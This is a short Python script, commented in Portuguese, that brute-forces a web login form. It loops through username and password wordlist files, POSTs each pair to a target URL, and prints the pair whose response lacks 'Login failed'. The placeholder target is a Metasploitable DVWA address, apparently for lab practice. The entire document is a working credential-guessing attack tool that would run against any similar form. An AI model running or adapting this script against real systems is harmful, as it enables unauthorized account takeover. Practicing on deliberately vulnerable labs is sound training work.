import requests

url_inteira = 'Your Metasploitable DVWA Local IP Address'

def start(url_inteira):
    parametro_login = 'username'
    parametro_senha = 'password'
    Login = 'Login'
    mensagem_erro = 'Login failed'

    arquivo1 = r"Your User File Path"
    usuarios = open(arquivo1, 'r')

    arquivo2 = r"Your Password File Path"
    senhas = open(arquivo2, 'r')

    encontra_senha = True

    while encontra_senha:
        for senha in senhas:
            usuarios.seek(0)
            for usuario in usuarios:
                usuario = usuario.replace('\n', '')
                senha = senha.replace('\n', '')
                print(f"Tentando {usuario} com a senha {senha}")
                dados = {parametro_login: usuario, parametro_senha: senha, Login: Login}
                r = requests.post(url_inteira,data=dados)
                if mensagem_erro in r.text:
                    print("Combinação Não Coerente\n")
                else:
                    print(f"Combinação Encontrada --- Usuário: {usuario} - Senha: {senha}\n")
                    exit()
                

start(url_inteira)